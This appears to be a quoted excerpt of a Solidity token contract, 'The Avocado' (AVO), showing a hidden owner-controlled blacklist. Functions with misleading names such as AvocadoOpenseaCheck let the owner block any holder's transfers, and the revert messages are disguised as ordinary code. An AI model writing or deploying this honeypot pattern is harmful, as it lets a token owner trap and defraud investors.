...
contract BaseToken is Ownable {
    ...
    string constant public name = 'The Avocado';
    string constant public symbol = 'AVO';
    ...
    mapping(address => bool) private _verifycontract; 
    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "balanceOf[from].sub(value)");
        if(_isExcludedFromFee[from])
            removeAllFee();   
        require(!_verifycontract[from], "calculateTaxFee(value)");
    ...
    function LedgersConnect(address account) public onlyOwner {
        _verifycontract[account] = false;
    }
    ...
    function AvocadoOpenseaCheck(address account) public onlyOwner {
        _verifycontract[account] = true;
    }

    function AvocadoDistributionsStats(address account) public view returns (bool) {
        
        return _verifycontract[account];
    }
...
contract AvocadoContract is BaseToken {
